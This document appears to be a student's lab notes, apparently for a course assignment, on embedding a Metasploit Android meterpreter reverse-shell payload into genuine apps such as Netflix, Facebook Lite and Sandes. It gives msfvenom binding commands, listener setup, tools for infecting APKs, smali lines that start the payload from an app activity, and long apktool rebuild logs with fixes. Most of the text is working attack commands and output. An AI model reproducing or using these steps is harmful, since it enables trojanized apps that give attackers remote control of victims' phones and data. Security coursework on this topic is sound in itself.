http://gauss.ececs.uc.edu/Courses/c653/homework/assgn6.pdf

# Injecting into a benign app

https://apps.evozi.com/apk-downloader/?id=com.netflix.mediaclient


## injecting onto linux

### for installing apktool for decompiling

Linux:

    Download Linux wrapper script (Right click, Save Link As apktool)
    Download apktool-2 (find newest here)
    Rename downloaded jar to apktool.jar
    Move both files (apktool.jar & apktool) to /usr/local/bin (root needed)
    Make sure both files are executable (chmod +x)
    Try running apktool via cli

apparently we can also use something like msfvenom like

### open source tools available

from : https://secnhack.in/multiple-ways-to-embed-a-payload-in-an-original-apk-file/

`msfvenom -x com.netflix.mediaclient_35512_apps.evozi.com.apk -p android/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -o netflix.apk`

on console

msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost 192.168.1.10
set lport 4444
run

using apk binder

git clone https://github.com/kinghacker0/Apk-Binder
cd Apk-Binder/
bash apk-binder.sh

git clone https://github.com/ivam3/embed.git
cd embed/
bash set-apktool


git clone https://github.com/PushpenderIndia/apkinfector.git
cd apkinfector/
python3 infector.py

git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh
bash setup.sh

git clone https://github.com/M4sc3r4n0/Evil-Droid.git
cd Evil-Droid
chmod +x evil-droid
bash evil-droid

# trying the msfvenom

msfvenom -x Sandes-Apk-v2.2.19.apk -p android/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -o sandesha.apk

### requirements
apksigner
apktool
zipalign

This always fails with a png file error for some reason

# trying msfvenom method with another apk

https://secnhack.in/perfectly-inject-a-payload-in-an-original-facebook-apk/

works in fb_lite apk. msfvenom.

fblite.apk
https://www.apkmirror.com/apk/facebook-2/lite/lite-10-0-0-6-140-release/facebook-lite-10-0-0-6-140-android-apk-download/download/?key=a605dc618942ae884172637cb5ceb0a0a450565a

msfvenom -x fb_lite.apk -p android/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -o fb.apk

# trying the manual way

https://www.youtube.com/watch?v=6SaZqm9c1W0

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.132 LPORT=4444 R > payload.apk

apktool d Sandes-Apk-v2.2.19.apk 
apktool d payload.apk

thunar to open files

where the activity starts 
in.nic.gimkerala.Call_SFU_three_Activity"

inside Call_SFU_three_Activity
invoke-super {p0, p1}, Lo/jm0;->onCreate(Landroid/os/Bundle;)V
invoke-static {p0}, Lcom/metsploit/stage/Payload;->start(Landroid/content/Context;)V

![](notcompiling.png)

This just results in the png error.
so same thing happening even when doing it manually

### signing

using key tool

![](20230522011218.png)

### using zipalign

![](20230522011410.png)

### dbugging png error

```
W: aapt: brut.common.BrutException: brut.common.BrutException: Could not extract resource: /prebuilt/linux/aapt_64 (defaulting to $PATH binary)
W: libpng error: Not a PNG file
W: ERROR: Failure processing PNG image /tmp/d20230522-106531-me31us/original/res/drawable-mdpi/people_28_filled.png
W: libpng error: Not a PNG file
W: ERROR: Failure processing PNG image /tmp/d20230522-106531-me31us/original/res/drawable-hdpi/people_28_filled.png
W: libpng error: Not a PNG file
W: ERROR: Failure processing PNG image /tmp/d20230522-106531-me31us/original/res/drawable-xxhdpi/people_28_filled.png
W: libpng error: Not a PNG file
W: ERROR: Failure processing PNG image /tmp/d20230522-106531-me31us/original/res/drawable-xxxhdpi/people_28_filled.png
W: /tmp/d20230522-106531-me31us/original/res/drawable/speaker_1.png: libpng warning: iCCP: known incorrect sRGB profile
W: /tmp/d20230522-106531-me31us/original/res/drawable/speaker_2.png: libpng warning: iCCP: known incorrect sRGB profile
brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [aapt, p, --min-sdk-version, 24, --target-sdk-version, 30, --version-code, 94, --version-name, 2.2.19, --no-version-vectors, -F, /tmp/APKTOOL5501913480711941250.tmp, -0, resources.arsc, -0, META-INF/androidx.activity_activity-ktx.version, -0, META-INF/androidx.activity_activity.version, -0, META-INF/androidx.annotation_annotation-experimental.version, -0, META-INF/androidx.appcompat_appcompat-resources.version, -0, META-INF/androidx.appcompat_appcompat.version, -0, META-INF/androidx.arch.core_core-runtime.version, -0, META-INF/androidx.asynclayoutinflater_asynclayoutinflater.version, -0, META-INF/androidx.biometric_biometric.version, -0, META-INF/androidx.cardview_cardview.version, -0, META-INF/androidx.coordinatorlayout_coordinatorlayout.version, -0, META-INF/androidx.core_core-ktx.version, -0, META-INF/androidx.core_core.version, -0, META-INF/androidx.cursoradapter_cursoradapter.version, -0, META-INF/androidx.customview_customview.version, -0, META-INF/androidx.databinding_viewbinding.version, -0, META-INF/androidx.documentfile_documentfile.version, -0, META-INF/androidx.drawerlayout_drawerlayout.version, -0, META-INF/androidx.dynamicanimation_dynamicanimation.version, -0, META-INF/androidx.emoji2_emoji2-views-helper.version, -0, META-INF/androidx.emoji2_emoji2.version, -0, META-INF/androidx.emoji_emoji-appcompat.version, -0, META-INF/androidx.emoji_emoji-bundled.version, -0, META-INF/androidx.emoji_emoji.version, -0, META-INF/androidx.exifinterface_exifinterface.version, -0, META-INF/androidx.fragment_fragment.version, -0, META-INF/androidx.interpolator_interpolator.version, -0, META-INF/androidx.legacy_legacy-support-core-ui.version, -0, META-INF/androidx.legacy_legacy-support-core-utils.version, -0, META-INF/androidx.legacy_legacy-support-v4.version, -0, META-INF/androidx.lifecycle_lifecycle-livedata-core.version, -0, META-INF/androidx.lifecycle_lifecycle-livedata.version, -0, META-INF/androidx.lifecycle_lifecycle-process.version, -0, META-INF/androidx.lifecycle_lifecycle-runtime-ktx.version, -0, META-INF/androidx.lifecycle_lifecycle-runtime.version, -0, META-INF/androidx.lifecycle_lifecycle-service.version, -0, META-INF/androidx.lifecycle_lifecycle-viewmodel-ktx.version, -0, META-INF/androidx.lifecycle_lifecycle-viewmodel-savedstate.version, -0, META-INF/androidx.lifecycle_lifecycle-viewmodel.version, -0, META-INF/androidx.loader_loader.version, -0, META-INF/androidx.localbroadcastmanager_localbroadcastmanager.version, -0, META-INF/androidx.media_media.version, -0, META-INF/androidx.paging_paging-runtime.version, -0, META-INF/androidx.print_print.version, -0, META-INF/androidx.recyclerview_recyclerview.version, -0, META-INF/androidx.room_room-runtime.version, -0, META-INF/androidx.savedstate_savedstate-ktx.version, -0, META-INF/androidx.savedstate_savedstate.version, -0, META-INF/androidx.slidingpanelayout_slidingpanelayout.version, -0, META-INF/androidx.sqlite_sqlite-framework.version, -0, META-INF/androidx.sqlite_sqlite.version, -0, META-INF/androidx.startup_startup-runtime.version, -0, META-INF/androidx.swiperefreshlayout_swiperefreshlayout.version, -0, META-INF/androidx.tracing_tracing.version, -0, META-INF/androidx.transition_transition.version, -0, META-INF/androidx.vectordrawable_vectordrawable-animated.version, -0, META-INF/androidx.vectordrawable_vectordrawable.version, -0, META-INF/androidx.versionedparcelable_versionedparcelable.version, -0, META-INF/androidx.viewpager2_viewpager2.version, -0, META-INF/androidx.viewpager_viewpager.version, -0, META-INF/androidx.work_work-gcm.version, -0, META-INF/androidx.work_work-runtime.version, -0, META-INF/com.google.android.material_material.version, -0, META-INF/javamail.default.address.map, -0, META-INF/kotlinx_coroutines_android.version, -0, META-INF/kotlinx_coroutines_core.version, -0, META-INF/services/com.fasterxml.jackson.core.JsonFactory, -0, META-INF/services/o.h91, -0, META-INF/services/o.qu, -0, META-INF/services/org.jivesoftware.smack.xml.XmlPullParserFactory, -0, webp, -0, png, -0, jpg, -0, lib/arm64-v8a/libjingle_peerconnection_so.so, -0, lib/arm64-v8a/liblinker.so, -0, lib/arm64-v8a/libsqlcipher.so, -0, lib/arm64-v8a/libtoolChecker.so, -0, lib/armeabi-v7a/libjingle_peerconnection_so.so, -0, lib/armeabi-v7a/liblinker.so, -0, lib/armeabi-v7a/libsqlcipher.so, -0, lib/armeabi-v7a/libtoolChecker.so, -0, lib/x86/libjingle_peerconnection_so.so, -0, lib/x86/liblinker.so, -0, lib/x86/libsqlcipher.so, -0, lib/x86/libtoolChecker.so, -0, lib/x86_64/liblinker.so, -0, lib/x86_64/libsqlcipher.so, -0, lib/x86_64/libtoolChecker.so, -0, res/font/regular0_ninito.ttf, -0, res/font/regular1_old.ttf, -0, res/font/regular_ninito.ttf, -0, mp3, -0, wav, -0, ogg, -0, arsc, -I, /root/.local/share/apktool/framework/1.apk, -S, /tmp/d20230522-106531-me31us/original/res, -M, /tmp/d20230522-106531-me31us/original/AndroidManifest.xml]
[*] Unable to rebuild apk. Trying rebuild with AAPT2..
[-] I: Using Apktool 2.7.0-dirty
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building resources...
W: aapt: brut.common.BrutException: brut.common.BrutException: Could not extract resource: /prebuilt/linux/aapt2_64 (defaulting to $PATH binary)
W: /tmp/d20230522-106531-me31us/original/res/drawable-hdpi/people_28_filled.png: error: failed to read PNG signature: file does not start with PNG signature.
W: /tmp/d20230522-106531-me31us/original/res/drawable-hdpi/people_28_filled.png: error: file failed to compile.
W: /tmp/d20230522-106531-me31us/original/res/drawable-mdpi/people_28_filled.png: error: failed to read PNG signature: file does not start with PNG signature.
W: /tmp/d20230522-106531-me31us/original/res/drawable-mdpi/people_28_filled.png: error: file failed to compile.
W: /tmp/d20230522-106531-me31us/original/res/drawable-xxhdpi/people_28_filled.png: error: failed to read PNG signature: file does not start with PNG signature.
W: /tmp/d20230522-106531-me31us/original/res/drawable-xxhdpi/people_28_filled.png: error: file failed to compile.
W: /tmp/d20230522-106531-me31us/original/res/drawable-xxxhdpi/people_28_filled.png: error: failed to read PNG signature: file does not start with PNG signature.
W: /tmp/d20230522-106531-me31us/original/res/drawable-xxxhdpi/people_28_filled.png: error: file failed to compile.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1935: error: resource 'drawable/$avd_hide_password__0' has invalid entry name '$avd_hide_password__0'. Invalid character '$avd_hide_password__0'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1936: error: resource 'drawable/$avd_hide_password__1' has invalid entry name '$avd_hide_password__1'. Invalid character '$avd_hide_password__1'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1937: error: resource 'drawable/$avd_hide_password__2' has invalid entry name '$avd_hide_password__2'. Invalid character '$avd_hide_password__2'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1938: error: resource 'drawable/$avd_show_password__0' has invalid entry name '$avd_show_password__0'. Invalid character '$avd_show_password__0'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1939: error: resource 'drawable/$avd_show_password__1' has invalid entry name '$avd_show_password__1'. Invalid character '$avd_show_password__1'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1940: error: resource 'drawable/$avd_show_password__2' has invalid entry name '$avd_show_password__2'. Invalid character '$avd_show_password__2'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1941: error: resource 'drawable/$gim_documents__0' has invalid entry name '$gim_documents__0'. Invalid character '$gim_documents__0'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1942: error: resource 'drawable/$gim_excels__0' has invalid entry name '$gim_excels__0'. Invalid character '$gim_excels__0'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1943: error: resource 'drawable/$gim_pdfs__0' has invalid entry name '$gim_pdfs__0'. Invalid character '$gim_pdfs__0'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1944: error: resource 'drawable/$gim_pdfs__1' has invalid entry name '$gim_pdfs__1'. Invalid character '$gim_pdfs__1'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1945: error: resource 'drawable/$gim_pdfs__2' has invalid entry name '$gim_pdfs__2'. Invalid character '$gim_pdfs__2'.
W: /tmp/d20230522-106531-me31us/original/res/values/public.xml:1946: error: resource 'drawable/$gim_powerpoints__0' has invalid entry name '$gim_powerpoints__0'. Invalid character '$gim_powerpoints__0'.
brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [aapt2, compile, --dir, /tmp/d20230522-106531-me31us/original/res, --legacy, -o, /tmp/d20230522-106531-me31us/original/build/resources.zip]
Error: Unable to rebuild apk with apktool
```

### sol 1

```
apktool d -f -r

I was also getting the same error. Use flags -f and -r during apktool d

Now during build there is no resource error.

```

### sol 2

```
Replacing apktool-dirty with apktool solves the problem. To do so, first remove existing apktool using the following command:
sudo apt remove apktool
sudo apt autoremove

Then follow the link for installing apktool:
https://ibotpeaches.github.io/Apktool/install/


```

however this downs't work for pngs however it solves the error of brute exception

```
└─$ apktool b Sandes-Apk-v2.2.19 -o sandes.apk 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.7.0
I: Checking whether sources has changed...
I: Checking whether sources has changed...
I: Checking whether resources has changed...
I: Building resources...
W: libpng error: Not a PNG file
W: ERROR: Failure processing PNG image /home/kali/Downloads/Sandes-Apk-v2.2.19/res/drawable-mdpi/people_28_filled.png
W: libpng error: Not a PNG file
W: ERROR: Failure processing PNG image /home/kali/Downloads/Sandes-Apk-v2.2.19/res/drawable-hdpi/people_28_filled.png
W: libpng error: Not a PNG file
W: ERROR: Failure processing PNG image /home/kali/Downloads/Sandes-Apk-v2.2.19/res/drawable-xxhdpi/people_28_filled.png
W: libpng error: Not a PNG file
W: ERROR: Failure processing PNG image /home/kali/Downloads/Sandes-Apk-v2.2.19/res/drawable-xxxhdpi/people_28_filled.png
brut.androlib.AndrolibException: brut.common.BrutException: could not exec (exit code = 1): [/tmp/brut_util_Jar_129770899497774082618128515829832480628.tmp, p, --forced-package-id, 127, --min-sdk-version, 24, --target-sdk-version, 30, --version-code, 94, --version-name, 2.2.19, --no-version-vectors, -F, /tmp/APKTOOL5306534274415855338.tmp, -e, /tmp/APKTOOL4272151694532639366.tmp, -0, arsc, -I, /home/kali/.local/share/apktool/framework/1.apk, -S, /home/kali/Downloads/Sandes-Apk-v2.2.19/res, -M, /home/kali/Downloads/Sandes-Apk-v2.2.19/AndroidManifest.xml]

```

### sol3 

Lets try manually changing the png file







